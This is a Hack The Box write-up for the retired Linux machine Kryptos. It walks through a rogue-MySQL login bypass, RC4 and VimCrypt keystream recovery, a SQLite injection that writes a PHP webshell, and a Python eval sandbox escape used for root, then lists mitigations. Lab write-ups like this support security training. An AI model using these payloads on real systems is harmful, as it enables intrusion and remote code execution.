---
machine: Kryptos
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, php, sqli, mysql, rc4, vimcrypt, sqlite, webshell, ecdsa, weak-rng, privesc]
---

# Kryptos — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Kryptos's login lets the client choose the cipher and the database server. Changing `db=cryptor` to a string with an attacker `host` and `port` makes the application connect to a rogue MySQL and bypass authentication. With RC4 and known plaintext the keystream is derived and the `/dev/` page is decrypted; it contains an injectable SQLite test. The injection writes a PHP webshell and gives system access, where `creds.txt` is VimCrypt-encrypted. Decryption reveals `rijndael`'s SSH password. On localhost, port `81` exposes `/eval`, which signs expressions with ECDSA and a weak generator; after recovering the seed, arbitrary code is signed and runs as root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22`: OpenSSH.
- `80`: Apache with the "Kryptos" PHP application.

```bash
echo '<IP> kryptos.htb' | sudo tee -a /etc/hosts
gobuster dir -u http://kryptos.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Enumeration

The main page has a login form with a cipher selector (`AES`/`RC4`) and a `db` parameter the server uses to connect to MySQL. `/encrypt.php` downloads a URL and returns it encrypted.

## Foothold

A rogue MySQL is started and the parameter is changed:

```text
db=cryptor;host=<LHOST>;port=3306;
```

The application connects to the fake server; answering the authentication query with a valid row logs in without credentials.

With RC4 the keystream is constant for the same key. Ask the server to encrypt a page whose content is known (`index.php`) and XOR plaintext with ciphertext to recover the keystream. Then decrypt `/dev/`, a test page with SQLite.

The SQLite injection writes a PHP file into the web root with `ATTACH DATABASE`:

```sql
ATTACH DATABASE '/var/www/html/<SHELL>.php' AS p;
CREATE TABLE p.x (c TEXT);
INSERT INTO p.x VALUES ('<?php system($_GET["cmd"]); ?>');
```

The webshell lists `/home/rijndael`. `creds.old` holds `rijndael / Password1`, an old password that no longer works, and `creds.txt` starts with `VimCrypt~02!`.

## Lateral movement

VimCrypt~02 reuses the same IV for the first blocks. Since the file starts with `rijndael /`, those 8 known bytes are XORed with the first block to recover the keystream and decrypt the rest:

```bash
./decrypt_vimcrypt.py creds.txt rijndael
```

The result is `rijndael`'s password, which works over SSH.

## Privilege escalation

`rijndael` can tunnel to local port `81`:

```bash
ssh -L 81:localhost:81 rijndael@kryptos.htb
```

The API has two routes:

- `/debug`: returns an expression (`2+2`) and its ECDSA signature.
- `/eval`: verifies the signature and evaluates the expression.

Signing uses a weak pseudo-random seed. Try the 209 possible seeds until one reproduces the `/debug` signature; it can then sign any expression. `builtins` are removed from `eval`, but the Python subclass chain recovers them:

```python
[c for c in ().__class__.__base__.__subclasses__()
 if c.__name__ == "catch_warnings"][0]._module.__builtins__.get('__import__')('os').system("<CMD>")
```

Sending the signed expression to `/eval` runs it as root.

## Evidence

- Login bypassed with a rogue MySQL and the `db` parameter.
- Derived RC4 keystream and decrypted `/dev/` page.
- SQLite injection and PHP webshell.
- `creds.txt` with VimCrypt and `rijndael`'s password.
- `/debug` signature and recovered seed.
- Signed expression executed by `/eval` as root.

## Lessons learned

- A parameter that builds the database connection lets the client point at its own server.
- RC4 with a fixed key reuses the keystream and falls to known plaintext.
- SQLite can write files with `ATTACH DATABASE`.
- VimCrypt backups are recoverable when part of the content is known.
- A weak random generator completely breaks an ECDSA signature.
- `eval` remains dangerous even with `builtins` removed.

## Mitigations and detection

- Do not let clients choose the database host or credentials.
- Replace RC4 with authenticated encryption (AES-GCM) and never reuse keys.
- Restrict `ATTACH DATABASE` and SQLite write permissions.
- Do not store credentials in weakly encrypted backups.
- Use a CSPRNG for signatures and rotate keys.
- Avoid `eval`; if unavoidable, isolate it and audit expressions.

## References

- [0xdf — Kryptos](https://0xdf.gitlab.io/2019/09/21/htb-kryptos.html)
- [Hack The Box — Kryptos](https://app.hackthebox.com/machines/kryptos)
